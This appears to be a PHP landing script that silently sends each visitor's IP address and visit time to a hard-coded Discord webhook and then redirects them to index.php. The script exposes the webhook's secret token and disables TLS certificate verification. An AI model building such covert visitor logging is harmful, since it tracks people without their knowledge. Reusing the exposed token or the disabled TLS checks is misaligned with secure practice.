<?php

include('src/system.php');
$time = date("g:i a");
$visit = "Someone's visiting our site =)\nIP Address: $ip\nTime Visit: $time";

$url = "https://discord.com/api/webhooks/1025753485356040222/QgGieMqWrDnFWvL0shlwGYu59iAQt3sCM03WCKJKpII_gwxmSYz3khi0Gw1zpOOZCQIF";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$headers = array("Content-Type: application/x-www-form-urlencoded",);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
$data = "content=```$visit```";
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);
curl_close($curl);


header("Location: index.php");
?>



